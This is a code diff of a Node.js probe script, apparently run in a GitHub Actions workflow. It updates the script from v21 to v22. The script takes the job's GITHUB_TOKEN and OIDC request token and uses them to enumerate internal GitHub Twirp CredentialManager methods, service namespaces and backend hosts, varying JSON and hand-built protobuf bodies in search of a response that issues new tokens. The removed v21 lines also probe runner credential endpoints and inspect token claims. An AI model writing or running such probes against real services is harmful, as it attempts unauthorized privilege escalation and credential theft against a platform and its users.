@@ -1,208 +1,215 @@
 const https = require('https');
 
-// v21: Probe github.authentication.v0.CredentialManager Twirp service
-// Discovered: GITHUB_TOKEN JWT has aud="/twirp/github.authentication.v0.CredentialManager/"
-// and sub="integration/15368" — this is an internal GitHub Twirp service
-// We have a valid JWT intended for this service — can we call it?
+// v22: CredentialManager Twirp service — format probing
+// Key finding from v21: /twirp/github.authentication.v0.CredentialManager/{method}
+// returns 400 "malformed" (not 404) on runner host with all tested methods.
+// This means the routes EXIST and auth passes (or is post-parse).
+// Goal: find the right request format to get a 200.
 
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
 const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
 const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
 const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
 const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
-const GITHUB_ACTOR = process.env.GITHUB_ACTOR || '';
 const GITHUB_REPOSITORY_ID = process.env.GITHUB_REPOSITORY_ID || '';
 
-function req(hostname, path, method, auth, body, extraHeaders) {
+function rawReq(hostname, path, method, headers, body) {
   return new Promise((resolve) => {
-    let data = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : null;
-    const hdrs = {
-      'Authorization': 'Bearer ' + auth,
-      'Accept': 'application/json',
-      'User-Agent': 'probe',
-      ...(extraHeaders || {})
-    };
-    if (data) {
-      hdrs['Content-Type'] = 'application/json';
-      hdrs['Content-Length'] = Buffer.byteLength(data);
-    }
-    const r = https.request({ hostname, path, method: method || 'GET', headers: hdrs },
-      (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
+    const opts = { hostname, path, method: method || 'POST', headers };
+    const r = https.request(opts, (res) => {
+      let d = ''; res.on('data', c => d += c);
+      res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400), headers: res.headers }));
+    });
     r.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    if (data) r.write(data);
+    if (body) { r.write(body); }
     r.end();
   });
 }
 
-function twirpReq(hostname, method, token, body) {
-  const path = '/twirp/github.authentication.v0.CredentialManager/' + method;
-  return new Promise((resolve) => {
-    const data = JSON.stringify(body || {});
-    const r = https.request({ hostname, path, method: 'POST',
-      headers: {
-        'Authorization': 'Bearer ' + token,
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(data),
-        'User-Agent': 'probe'
-      }
-    }, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 500) })); });
-    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    r.write(data); r.end();
-  });
+function twirpJson(hostname, service, method, token, body) {
+  const path = '/twirp/' + service + '/' + method;
+  const data = typeof body === 'string' ? body : JSON.stringify(body);
+  return rawReq(hostname, path, 'POST', {
+    'Authorization': token ? 'Bearer ' + token : undefined,
+    'Content-Type': 'application/json',
+    'Content-Length': Buffer.byteLength(data),
+    'User-Agent': 'probe',
+    'Accept': 'application/json',
+  }, data);
+}
+
+function twirpProto(hostname, service, method, token, bodyBuf) {
+  const path = '/twirp/' + service + '/' + method;
+  return rawReq(hostname, path, 'POST', {
+    'Authorization': token ? 'Bearer ' + token : undefined,
+    'Content-Type': 'application/protobuf',
+    'Content-Length': bodyBuf.length,
+    'User-Agent': 'probe',
+    'Accept': 'application/protobuf',
+  }, bodyBuf);
+}
+
+// Encode a protobuf string field: field_num << 3 | 2 (LEN wire type)
+function protoString(fieldNum, value) {
+  const valueBytes = Buffer.from(value, 'utf8');
+  const tag = (fieldNum << 3) | 2;
+  const tagBuf = Buffer.from([tag]);
+  const lenBuf = Buffer.from([valueBytes.length]);
+  return Buffer.concat([tagBuf, lenBuf, valueBytes]);
 }
 
 async function main() {
-  console.log('=== V21: CredentialManager Twirp Probe ===');
+  console.log('=== V22: CredentialManager format probe ===');
   console.log('Repo:', GITHUB_REPOSITORY, '| Run:', GITHUB_RUN_ID);
 
-  // Extract the JWT part of GITHUB_TOKEN for analysis
-  const tokenMatch = GITHUB_TOKEN.match(/^ghs_(\d+)_(.+)$/);
-  const tokenId = tokenMatch ? tokenMatch[1] : null;
-  console.log('GITHUB_TOKEN format: ghs_' + (tokenId || '?') + '_<JWT416chars>');
-  console.log('Token aud: /twirp/github.authentication.v0.CredentialManager/');
-  console.log('Token sub: integration/15368');
-
-  // The OIDC host varies; get it
   const oidcHost = OIDC_URL ? new URL(OIDC_URL).hostname : null;
   const poolId = OIDC_URL ? new URL(OIDC_URL).pathname.split('/')[1] : null;
   console.log('OIDC host:', oidcHost, '| Pool:', poolId);
 
-  // === PART 1: Try CredentialManager on the runner host ===
-  console.log('\n=== PART 1: CredentialManager on runner host ===');
-  if (oidcHost) {
-    // Methods we hypothesize exist (based on gRPC/Twirp naming conventions for credential managers)
-    const methods = [
-      'GetToken',
-      'IssueToken',
-      'GetCredentials',
-      'RefreshToken',
-      'ValidateToken',
-      'GetInstallationToken',
-      'ListTokens',
-      'GetJobToken',
-      'GetActionToken',
-      'GetRepoToken',
-      'GetOrgToken',
-    ];
-    for (const method of methods) {
-      const r = await twirpReq(oidcHost, method, GITHUB_TOKEN, {
-        repository: GITHUB_REPOSITORY,
-        repository_id: GITHUB_REPOSITORY_ID,
-        run_id: GITHUB_RUN_ID,
-      });
-      const status = r.status;
-      // 404 bad_route = method doesn't exist
-      // 401/403 = method exists but we're not authorized
-      // 400 = method exists, wrong params
-      // 200 = !!!
-      if (status !== 'ERR') {
-        const label = r.body.includes('bad_route') ? '404(no-route)' : String(status);
-        console.log('[CRED_RUNNER] ' + method + ': ' + label + ' | ' + r.body.substring(0, 150));
-      }
+  if (!oidcHost) { console.log('No OIDC host!'); return; }
+
+  const SVC = 'github.authentication.v0.CredentialManager';
+  const METHOD = 'GetToken';
+
+  // === TEST 1: Determine if auth is checked before request parsing ===
+  // Compare: no auth vs valid GITHUB_TOKEN vs valid OIDC_TOKEN
+  console.log('\n=== TEST 1: Auth check timing (no-auth vs token) ===');
+  const noAuth = await twirpJson(oidcHost, SVC, METHOD, null, {});
+  const withToken = await twirpJson(oidcHost, SVC, METHOD, GITHUB_TOKEN, {});
+  const withOidc = await twirpJson(oidcHost, SVC, METHOD, OIDC_TOKEN, {});
+  console.log('[NO_AUTH]    :', noAuth.status, '|', noAuth.body.substring(0, 100));
+  console.log('[GH_TOKEN]   :', withToken.status, '|', withToken.body.substring(0, 100));
+  console.log('[OIDC_TOKEN] :', withOidc.status, '|', withOidc.body.substring(0, 100));
+  // If all three return the same error → auth is not the gate (or happens after format check)
+  // If no-auth differs → auth IS checked first
+
+  // === TEST 2: Binary protobuf with empty body ===
+  console.log('\n=== TEST 2: Binary protobuf encoding ===');
+  // Empty protobuf message = 0 bytes
+  const emptyProto = Buffer.alloc(0);
+  const r2a = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, emptyProto);
+  console.log('[PROTO_EMPTY]:', r2a.status, '|', r2a.body.substring(0, 150));
+
+  // Protobuf with field 1 = "Zelys-DFKH/depbot-ssrf-test"
+  const repoField = protoString(1, GITHUB_REPOSITORY);
+  const r2b = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, repoField);
+  console.log('[PROTO_F1_REPO]:', r2b.status, '|', r2b.body.substring(0, 150));
+
+  // Protobuf with field 1 = "api.github.com" (audience)
+  const audField = protoString(1, 'api.github.com');
+  const r2c = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, audField);
+  console.log('[PROTO_F1_AUD]:', r2c.status, '|', r2c.body.substring(0, 150));
+
+  // Protobuf with field 2 = repository_id (varint)
+  const repoIdBuf = Buffer.from([0x10, ...encodeVarint(parseInt(GITHUB_REPOSITORY_ID) || 1277673145)]);
+  const r2d = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, repoIdBuf);
+  console.log('[PROTO_F2_REPOID]:', r2d.status, '|', r2d.body.substring(0, 150));
+
+  // === TEST 3: JSON field name variations ===
+  console.log('\n=== TEST 3: JSON field name variations for GetToken ===');
+  const fieldVariants = [
+    {},
+    { audience: 'api.github.com' },
+    { audience: 'api.github.com', repository: GITHUB_REPOSITORY },
+    { resource: GITHUB_REPOSITORY },
+    { token_type: 'installation' },
+    { repository_full_name: GITHUB_REPOSITORY },
+    { repository_id: GITHUB_REPOSITORY_ID },
+    { installation_id: '19454198618' },
+    { run_id: GITHUB_RUN_ID, repository: GITHUB_REPOSITORY },
+    { context: { repository: GITHUB_REPOSITORY, run_id: GITHUB_RUN_ID } },
+  ];
+  for (const body of fieldVariants) {
+    const r = await twirpJson(oidcHost, SVC, METHOD, GITHUB_TOKEN, body);
+    const key = Object.keys(body).join(',') || 'empty';
+    const isOk = r.status === 200;
+    if (isOk) console.log('[JSON_FIELD ***SUCCESS***] ' + key + ': ' + r.status + ' | ' + r.body);
+    else console.log('[JSON_FIELD] ' + key + ': ' + r.status + ' | ' + r.body.substring(0, 80));
+  }
+
+  // === TEST 4: Other method names with correct-ish body ===
+  console.log('\n=== TEST 4: Method enumeration with audience body ===');
+  const methods = [
+    'GetToken', 'IssueToken', 'GetInstallationToken', 'GetCredentials',
+    'GetJobToken', 'GetActionsToken', 'GetActionToken', 'CreateToken',
+    'ExchangeToken', 'GenerateToken', 'GetAccessToken', 'GetOAuthToken',
+    'GetRepositoryToken', 'GetRepoToken', 'GetOrganizationToken',
+    'GetWorkflowToken', 'GetRunnerToken',
+  ];
+  const audbody = { audience: 'api.github.com', repository: GITHUB_REPOSITORY };
+  for (const m of methods) {
+    const r = await twirpJson(oidcHost, SVC, m, GITHUB_TOKEN, audbody);
+    const isBadRoute = r.body.includes('bad_route') || r.body.includes('no handler');
+    const label = isBadRoute ? '404(NO_ROUTE)' : String(r.status);
+    const isOk = r.status === 200;
+    if (isOk) console.log('[METHOD ***SUCCESS***] ' + m + ': ' + r.status + ' | ' + r.body.substring(0, 200));
+    else if (!isBadRoute) console.log('[METHOD EXISTS] ' + m + ': ' + label + ' | ' + r.body.substring(0, 80));
+    else console.log('[METHOD] ' + m + ': ' + label);
+  }
+
+  // === TEST 5: Try CredentialManager on other internal hostnames ===
+  console.log('\n=== TEST 5: Alternative CredentialManager hosts ===');
+  // The runner might also have a CredentialManager at the standard runner backend
+  // Let's try common GitHub internal endpoints
+  const altHosts = [
+    'pipelines.actions.githubusercontent.com',
+    'productionresults.actions.githubusercontent.com',
+    'results-receiver.actions.githubusercontent.com',
+  ];
+  for (const host of altHosts) {
+    const r = await twirpJson(host, SVC, 'GetToken', GITHUB_TOKEN, { audience: 'api.github.com' });
+    const isBadRoute = r.body.includes('bad_route');
+    if (r.status !== 'ERR') {
+      console.log('[ALT_HOST] ' + host + ': ' + r.status + ' | ' + r.body.substring(0, 100));
     }
   }
 
-  // === PART 2: Try CredentialManager on api.github.com ===
-  console.log('\n=== PART 2: CredentialManager on api.github.com ===');
-  const apiMethods = ['GetToken', 'IssueToken', 'GetInstallationToken', 'GetCredentials'];
-  for (const method of apiMethods) {
-    const r = await twirpReq('api.github.com', method, GITHUB_TOKEN, {});
-    console.log('[CRED_API] ' + method + ': ' + r.status + ' | ' + r.body.substring(0, 150));
-  }
+  // === TEST 6: What's the full path structure? Check GET vs POST ===
+  console.log('\n=== TEST 6: HTTP method variations ===');
+  const getReq = await rawReq(oidcHost, '/twirp/' + SVC + '/GetToken', 'GET', {
+    'Authorization': 'Bearer ' + GITHUB_TOKEN,
+    'Accept': 'application/json',
+  }, null);
+  console.log('[GET_METHOD]:', getReq.status, '|', getReq.body.substring(0, 100));
 
-  // === PART 3: Try CredentialManager on github.com ===
-  console.log('\n=== PART 3: CredentialManager on github.com ===');
-  const ghMethods = ['GetToken', 'IssueToken', 'GetInstallationToken'];
-  for (const method of ghMethods) {
-    const r = await twirpReq('github.com', method, GITHUB_TOKEN, {});
-    console.log('[CRED_GH] ' + method + ': ' + r.status + ' | ' + r.body.substring(0, 150));
-  }
+  // Try with specific Twirp version header
+  const twirpHeader = await rawReq(oidcHost, '/twirp/' + SVC + '/GetToken', 'POST', {
+    'Authorization': 'Bearer ' + GITHUB_TOKEN,
+    'Content-Type': 'application/json',
+    'Content-Length': 2,
+    'Twirp-Version': '7.2.0',
+    'User-Agent': 'twirp/7.2.0',
+  }, Buffer.from('{}'));
+  console.log('[TWIRP_HDR]:', twirpHeader.status, '|', twirpHeader.body.substring(0, 100));
 
-  // === PART 4: Try OIDC token against CredentialManager ===
-  // Maybe OIDC_TOKEN (not GITHUB_TOKEN) is what CredentialManager expects
-  console.log('\n=== PART 4: CredentialManager with OIDC_TOKEN ===');
-  if (oidcHost && OIDC_TOKEN) {
-    for (const method of ['GetToken', 'IssueToken', 'GetInstallationToken']) {
-      const r = await twirpReq(oidcHost, method, OIDC_TOKEN, {});
-      const label = r.body.includes('bad_route') ? '404(no-route)' : String(r.status);
-      console.log('[CRED_OIDC] ' + method + ': ' + label + ' | ' + r.body.substring(0, 150));
-    }
-  }
-
-  // === PART 5: Check if the runner-service pool accepts arbitrary method names ===
-  // At /{poolId}// we know: /secrets → HMAC, /health → 200
-  // Does /credentials exist without HMAC? Does /token?
-  console.log('\n=== PART 5: Runner service credential/token endpoints ===');
-  if (oidcHost && poolId) {
-    const basePath = '/' + poolId + '//';
-    const credPaths = [
-      'credentials',
-      'token',
-      'tokens',
-      'actions-token',
-      'installation-token',
-      'access-token',
-      'oauth-token',
-    ];
-    for (const p of credPaths) {
-      const r = await req(oidcHost, basePath + p, 'GET', GITHUB_TOKEN);
-      const hmacRequired = r.body.includes('hmac is missing');
-      const label = hmacRequired ? 'HMAC_REQUIRED' : String(r.status);
-      if (!hmacRequired || r.status !== 400) {
-        console.log('[RUNNER_CRED] ' + p + ': ' + label + ' | ' + r.body.substring(0, 150));
-      } else {
-        console.log('[RUNNER_CRED] ' + p + ': HMAC_REQUIRED(400)');
-      }
-    }
-  }
-
-  // === PART 6: What is azc claim "site/19454198618"? ===
-  // Hypothesis: 19454198618 is the GitHub Actions app installation ID on github.com
-  // Let's verify by checking GitHub API for installation info
-  console.log('\n=== PART 6: Integration/installation ID analysis ===');
-  const integrationId = 15368;  // from aid/sub in JWT
-  const siteId = 19454198618;   // from azc claim
-
-  // Check if integration 15368 is a GitHub App
-  const appR = await req('api.github.com', '/apps/' + integrationId, 'GET', GITHUB_TOKEN);
-  console.log('[APP] /apps/' + integrationId + ':', appR.status, '|', appR.body.substring(0, 200));
-
-  // Check the GitHub Actions app specifically
-  const actionsAppR = await req('api.github.com', '/apps/github-actions', 'GET', GITHUB_TOKEN);
-  console.log('[APP] /apps/github-actions:', actionsAppR.status, '|', actionsAppR.body.substring(0, 200));
-
-  // Check installation
-  const installR = await req('api.github.com', '/app/installations/' + siteId, 'GET', GITHUB_TOKEN);
-  console.log('[INSTALL] /app/installations/' + siteId + ':', installR.status, '|', installR.body.substring(0, 200));
-
-  // === PART 7: Can GITHUB_TOKEN JWT authenticate to any Actions service we know about? ===
-  console.log('\n=== PART 7: GITHUB_TOKEN on known Twirp services ===');
-  if (oidcHost) {
-    // Test known Twirp services on the runner host with GITHUB_TOKEN
-    const services = [
-      'github.actions.results.api.v1.ArtifactService/ListArtifacts',
-      'github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
-      'github.actions.results.api.v1.LogService/GetStepSummary',
-    ];
-    for (const svc of services) {
-      const r = await new Promise((resolve) => {
-        const data = JSON.stringify({});
-        const p = '/' + poolId + '//' + svc;  // Use the pool prefix
-        const r2 = https.request({ hostname: oidcHost, path: p, method: 'POST',
-          headers: {
-            'Authorization': 'Bearer ' + GITHUB_TOKEN,
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(data)
-          }
-        }, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
-        r2.on('error', e => resolve({ status: 'ERR', body: e.message }));
-        r2.write(data); r2.end();
-      });
-      console.log('[TWIRP_GHT] ' + svc.split('/').pop() + ': ' + r.status + ' | ' + r.body.substring(0, 100));
-    }
+  // === TEST 7: Enumerate service namespace ===
+  // Maybe it's under a slightly different namespace
+  console.log('\n=== TEST 7: Service namespace variations ===');
+  const namespaces = [
+    'github.authentication.v0.CredentialManager',
+    'github.authentication.v1.CredentialManager',
+    'github.actions.authentication.v0.CredentialManager',
+    'authentication.CredentialManager',
+    'github.authentication.CredentialManager',
+  ];
+  for (const ns of namespaces) {
+    const r = await twirpJson(oidcHost, ns, 'GetToken', GITHUB_TOKEN, { audience: 'api.github.com' });
+    const isBadRoute = r.body.includes('bad_route') || r.body.includes('no handler') || r.status === 404;
+    if (!isBadRoute) console.log('[NS EXISTS] ' + ns + ': ' + r.status + ' | ' + r.body.substring(0, 100));
+    else console.log('[NS] ' + ns + ': 404');
   }
 
   console.log('\nDone.');
+}
+
+function encodeVarint(n) {
+  const bytes = [];
+  while (n > 127) {
+    bytes.push((n & 0x7F) | 0x80);
+    n = n >>> 7;
+  }
+  bytes.push(n & 0x7F);
+  return bytes;
 }
 
 main().catch(e => console.log('Fatal:', e.message));
